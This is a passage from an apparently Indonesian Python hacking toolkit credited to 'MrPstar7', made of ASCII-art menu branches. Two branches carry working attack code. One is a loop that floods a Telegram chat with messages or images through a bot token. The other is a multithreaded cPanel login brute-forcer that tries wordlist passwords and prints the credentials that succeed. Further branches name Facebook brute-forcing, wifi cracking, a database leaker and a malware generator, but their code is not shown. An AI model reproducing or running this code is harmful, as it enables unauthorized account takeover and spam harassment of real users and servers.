⠀⠉⢻⠇⠀⠀⠀⠈⠣⠀⠀⠀⠀⢀⡽⣷⣄⡈⠉⠉⠀⠀⣊⣽⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠉⡴⣫⣿⣿⣒⡢⢄⣠⡾⠋⠉⠉⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⠛⣷⣤⢀⡄⢀⠇⣠⠂⣸⣡⣚⣼⠋⠁⠀⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣾⡀⡏⠙⡗⠻⠟⢻⠚⢻⢹⠙⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠓⠧⠴⣇⣴⣄⢼⣤⠟⠚⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                   `             '
                               {B}  Hash Cracker 
                                 By : {M}MrPstar7 
""")
        Title("Hash Cracker")
        Hash_Cracker()
        Continue()
        a()
            
    elif choice == "28":
        clear()
        Title("Email Search")
        if os.name == "nt":
            OnlyLinux()
        else:
            print(f"""{B}
            
  ______                 _ _             _____                     _     
 |  ____|               (_) |           / ____|                   | |    
 | |__   _ __ ___   __ _ _| |  ______  | (___   ___  __ _ _ __ ___| |__  
 |  __| | '_ ` _ \ / _` | | | |______|  \___ \ / _ \/ _` | '__/ __| '_ \ 
 | |____| | | | | | (_| | | |           ____) |  __/ (_| | | | (__| | | |
 |______|_| |_| |_|\__,_|_|_|          |_____/ \___|\__,_|_|  \___|_| |_|
                         
""")                 
            email = input(f"{M}[{P}+{M}] {O}Enter a email address : {P}")
            email_search(email)
        Continue()
        a()
        
    elif choice == "29":
        clear()
        os.system("neofetch --ascii_distro arch linux")
        Title("Spam Bot Telegram Penipu")
        print(f"{M}[{P}01{M}] {P}Spam Text\n{M}[{P}02{M}] {P}Spam Image\n{M}[{P}03{M}] {P}Spam Text + Image")
        sp = input(f"\n{M}[{P}+{M}] {O}Select Menu -> {P}")
        if sp in['01','1']:
            token = input(f"{M}[{P}+{M}] {O}Enter Token : {P}")
            chat_id = input(f"{M}[{P}+{M}] {O}Enter Chat Id : {P}")
            text = input(f"{M}[{P}+{M}] {O}Text : {P}")
            jumlah = int(input(f"{M}[{P}+{M}] {O}Jumlah : {P}"))
            print(f"{M}[{P}~{M}] {H}Processing...")
            for i in range(jumlah):
                send_text = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&parse_mode=Markdown&text={text}'
                response = requests.get(send_text)
                print(f"{M}[{P}+{M}] {H}Succes : {B}{i}", )
            print(f"{H}Successfully Spam With Text : {O}{text}{H} With Amount {O}{jumlah}")
            Continue()
            a()
            
        if sp in['02','2']:
            token = input(f"{M}[{P}+{M}] {O}Enter Token : {P}")
            chat_id = input(f"{M}[{P}+{M}] {O}Enter Chat Id : {P}")
            photo_url = input(f"{M}[{P}+{M}] {O}Image Url : {P}")
            jumlah = int(input(f"{M}[{P}+{M}] {O}Jumlah : {P}"))
            print(f"{M}[{P}~{M}] {H}Processing...")
            for i in range(jumlah):
                send_photo = f'https://api.telegram.org/bot{token}/sendPhoto?chat_id={chat_id}&photo={photo_url}'
                response = requests.get(send_photo)
                print(f"{M}[{P}+{M}] {H}Succes : {B}{i}", )
            print(f"{H}Successfully Spam Image With Amount {O}{jumlah}")
            Continue()
            a()
        if sp in['03','3']:
            token = input(f"{M}[{P}+{M}] {O}Enter Token : {P}")
            chat_id = input(f"{M}[{P}+{M}] {O}Enter Chat Id : {P}")
            text = input(f"{M}[{P}+{M}] {O}Text : {P}")
            photo_url = input(f"{M}[{P}+{M}] {O}Image Url : {P}")
            jumlah = int(input(f"{M}[{P}+{M}] {O}Jumlah : {P}"))
            print(f"{M}[{P}~{M}] {H}Processing...")
            for i in range(jumlah):
                send_photo = f'https://api.telegram.org/bot{token}/sendPhoto?chat_id={chat_id}&photo={photo_url}'
                send_text = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&parse_mode=Markdown&text={text}'
                response = requests.get(send_photo)
                responset = requests.get(send_text)
                print(f"{M}[{P}+{M}] {H}Succes : {B}{i}", )
            print(f"{H}Successfully Spam With Text : {O}{text} {H}And Image With Amount {O}{jumlah}")
            Continue()
            a()
            
    elif choice == "30":
        clear()
        Title("Get Source Code Website")
        print(f"""{M}
  ██████  ▒█████   █    ██  ██▀███   ▄████▄  ▓█████     ▄████▄   ▒█████  ▓█████▄ ▓█████ 
▒██    ▒ ▒██▒  ██▒ ██  ▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀    ▒██▀ ▀█  ▒██▒  ██▒▒██▀ ██▌▓█   ▀ 
░ ▓██▄   ▒██░  ██▒▓██  ▒██░▓██ ░▄█ ▒▒▓█    ▄ ▒███      ▒▓█    ▄ ▒██░  ██▒░██   █▌▒███   
  ▒   ██▒▒██   ██░▓▓█  ░██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄    ▒▓▓▄ ▄██▒▒██   ██░░▓█▄   ▌▒▓█  ▄ 
▒██████▒▒░ ████▓▒░▒▒█████▓ ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒   ▒ ▓███▀ ░░ ████▓▒░░▒████▓ ░▒████▒
▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░
░ ░▒  ░ ░  ░ ▒ ▒░ ░░▒░ ░ ░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░     ░  ▒     ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░
░  ░  ░  ░ ░ ░ ▒   ░░░ ░ ░   ░░   ░ ░           ░      ░        ░ ░ ░ ▒   ░ ░  ░    ░   
      ░      ░ ░     ░        ░     ░ ░         ░  ░   ░ ░          ░ ░     ░       ░  ░
                                    ░                  ░                  ░             
""")
        source_web()
        Continue()
        a()
        
    elif choice == "31":
        clear()
        Title("Cpanel Bruteforce ")
        print(f"""{M}
                          .                                                      .
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⠞⠋⠁⣀⣠⣴⣶⣾⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠟⢻⣧⣤⣴⣿⠿⠋⠁⣴⡿⠿⢿⣿⣿⣿⣷⣶⣶⣶⣶⡶⠶⠚⠁⠀⠀⣠⣾⠏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣾⣿⣥⣤⣤⣭⣍⣁⡀⠀⠀⠘⣿⣇⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⢀⣠⣴⣿⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠘⢿⣷⣦⣄⣀⣀⣀⣀⣀⣤⣤⣶⣾⣿⡿⠛⠁⠀⠀⢀⡀
⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⣩⣿⠿⠋⠁⠀⠀⣠⣶⠟⠋⠀
⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢄⠀⠀⠀⠀⣼⣿⠁⠀⠀⠀⢠⣾⡿⠃⠀⠀⠀
⠀⠀⠀⠀⣠⡟⡡⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠸⣿⣄⠀⢀⣴⣿⣿⠁⠀⠀⠀⠀
⠀⠀⠀⢠⡟⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⢀⣤⠶⠒⠛⠛⠒⠲⢤⡀⠀⠘⣷⠀⠀⠀⠙⠻⠿⠿⢿⣿⠇⠀⠀⠀⠀⠀
⠀⣠⡶⠿⢇⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⢀⡴⢪⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠙⢄⠀⢹⡄⠀⠀⠀⠀⠀⢀⣿⡟⠀⠀⠀⠀⠀⠀
⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⣦⣤⡞⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡄⠀⡇⠀⠀⠀⢀⣠⣾⠟⢠⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡟⣿⣆⢀⠀⠀⠀⠀⠀⣠⠾⠕⠉⢉⣉⠀⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠃⠀⣠⣶⣿⠟⠋⢀⣾⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣯⣧⠠⠮⠴⠞⣁⣠⣴⣾⣿⣿⣷⡌⣿⠋⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠉⠀⠀⣠⣾⡏⠀⠀⠀⠀⠀⠀
⠀⣠⠴⢾⣿⣿⣿⣿⠀⠳⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣤⣴⣾⣿⠟⠀⠀⠀⠀⠀⠀⠀
⢰⠁⠀⠀⠙⣿⣿⣧⠈⡆⢻⢿⣿⣿⣿⣿⣿⠿⠟⣃⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠂⣼⠀⢈⣩⣽⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀
⣞⠀⠀⠀⣠⣿⣿⡿⠀⢺⡀⢑⡈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠈⠻⣦⡞⠀⠀⠀⠀⠀⢠⣮⣾⣿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢻⣦⣄⣴⡿⡿⠷⣿⠠⣀⡨⠥⣞⣳⡄⠀⢀⡀⠀⠀⠀⠀⠀⣀⣿⣇⠀⠀⠀⣀⣴⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠉⢻⠇⠀⠀⠀⠈⠣⠀⠀⠀⠀⢀⡽⣷⣄⡈⠉⠉⠀⠀⣊⣽⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠉⡴⣫⣿⣿⣒⡢⢄⣠⡾⠋⠉⠉⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⠛⣷⣤⢀⡄⢀⠇⣠⠂⣸⣡⣚⣼⠋⠁⠀⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣾⡀⡏⠙⡗⠻⠟⢻⠚⢻⢹⠙⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠓⠧⠴⣇⣴⣄⢼⣤⠟⠚⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                   `             '
                               {B}  Cpanel Bruteforce 
                                    By : {M}MrPstar7 
""")
        
        url = input(f"\n{M}[{P}+{M}] {O}Enter Url (Use http/https) : {P}")
        username = input(f"{M}[{P}+{M}] {O}Enter Username :{P} ")
        wordlist = input(f"{M}[{P}+{M}] {O}Enter Wordlist :{P} ")
        user_input = int(input(f"{M}[{P}+{M}] {O}Enter Threads : {P}"))
        
        def bf(password):
            data = {
                "user": username,
                "pass": password,
                "goto_uri": "/"
            }
            req = requests.post(url + '/login/?login_only=1', data=data)
            if '"status":1,' in req.text:
                print(f"{M}[{P}+{M}] {H}Login Successful -> {username}:{password}")
            else:
                print(f"{M}[{P}+{M}] {M}Login Failed -> {username}:{password}")
        
        with open(wordlist, 'r') as f:
            passwords = [line.strip() for line in f]
        
        pool = Pool(processes=user_input)
        pool.map(bf, passwords)
        pool.close()
        pool.join()
        Continue()
        a()
        
    elif choice == "32":
        clear()
        Title("Nik Checker")
        nik()
        Continue()
        a()
        
    elif choice == "33":
        clear()
        Title("Report Facebook")
        fb_report()
        Continue()
        a()
        
    elif choice == "34":
        clear()
        Title("Admin Login Page Finder")
        admin_finder()
        Continue()
        a()
        
    elif choice == "35":
        clear()
        Title("Crack All Wifi Password ")
        os.system("python3 wificrack.py password.txt")
        Continue()
        a()
    
    elif choice == "36":
        clear()
        Title("Bruteforce Facebook Premium ")
        os.system("python3 ./Settings/Program/premium.py")
        Continue()
        a()
      
    elif choice == "37":
        clear()
        print(f"""{M}
    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣶⡆⠀⠀⠀⠀⢰⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣧⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣧⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⠀⢀⣠⣴⣾⠿⠟⠛⠛⠛⠛⠛⠛⠛⠻⠿⢿⣷⣦⣄⠀⠀⣾⣿⣿⣿⣿⣿⣿⡄⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⢿⡿⠋⠀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⡀⠈⠛⢿⡿⣼⣿⣿⣿⣿⣿⣿⣿⠇
           ⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠘⢿⣿⣿⣿⣿⣿⣿⣿⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠇⠘⣿⡟⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⢻⣿⠀⠸⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
⠀⣰⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣧⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⣼⡟⠀⣾⣿⣿⣿⣷⠀⠀⠀ ⠉⠛⢿⣿⣿⣿⣿⣿⡄⠀
⢀⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡄⠘⣿⣷⣤⣀⣀⡀⠀⣈⣩⣿⣿⣍⣁⠀⣀⣀⣀⣠⣼⣿⠇⢠⣿⣿⣿⣿⡟⠀⠀⠀ ⠀⠀⠀⠙⢿⣿⣿⣿⣷⠀
⣸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡟⠀⣨⣿⣿⣿⣿⣿⣿⣿⡿⢀⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀ ⠀⠀⠀⠀⠈⢿⣿⣿⣿⡇
⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣿⣿⡿⠛⠉⣿⣿⣧⣾⣷⣼⣿⣿⡟⠋⠉⢻⣿⡿⠀⣸⣿⣿⣿⣿⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇
⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣄⠈⠋⠉⠒⠀⠀⣿⣿⣿⣿⢿⡟⣻⣿⡇⠀⠀⠙⠉⣀⣴⣿⣿⣿⣿⠇⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇
⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣾⣷⣄⡀⠀⣿⣿⣿⣿⢸⡇⣿⣿⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠘⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⢸⣿⢸⡇⣿⡿⠀⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢸⣿⣿⠁
⠀⠙⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⡿⠀⢸⣿⢸⣿⢸⡇⣿⡇⠀⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠘⠿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⡿⣱⡆⠸⣿⢸⣿⣿⡇⣿⡇⠀⣞⠿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣷⣄⣈⡈⠉⠈⢁⣉⣁⣴⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠛⠋⠉⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


███████╗███╗   ███╗ █████╗ ██╗██╗         ███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔══██╗██║██║         ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
█████╗  ██╔████╔██║███████║██║██║         ███████╗██║     ██████╔╝███████║██████╔╝█████╗  ██████╔╝
██╔══╝  ██║╚██╔╝██║██╔══██║██║██║         ╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║ ╚═╝ ██║██║  ██║██║███████╗    ███████║╚██████╗██║  ██║██║  ██║██║     ███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                             
""")
        Title("Email Scraper")
        mail()
        Continue()
        a()
        
    elif choice == "38":
        clear()
        print(f"""{M}
██████╗  █████╗ ████████╗ █████╗ ██████╗  █████╗ ███████╗███████╗    ██╗     ███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝    ██║     ██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██║  ██║███████║   ██║   ███████║██████╔╝███████║███████╗█████╗      ██║     █████╗  ███████║█████╔╝ █████╗  ██████╔╝
██║  ██║██╔══██║   ██║   ██╔══██║██╔══██╗██╔══██║╚════██║██╔══╝      ██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║   ██║   ██║  ██║██████╔╝██║  ██║███████║███████╗    ███████╗███████╗██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

""")
        Title("Database Leaker V2")
        data2()
        Continue()
        a()   
               
    elif choice == "39":
        clear()
        print(f"""
{M}██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗         ███████╗██╗███╗   ██╗██████╗ ███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║         ██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║         █████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║         ██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝███████║██║  ██║███████╗███████╗███████╗    ██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                         
""")
        Title("Webshell Finder")
        shell()
        Continue()
        a()
    
    elif choice == "40":
        clear()
        Title("Malware Generator")
        Malware()
        Continue()
        a()
    
    else:
        print(f"{M}Input Yang Anda Masukkan Salah!")
        a()
        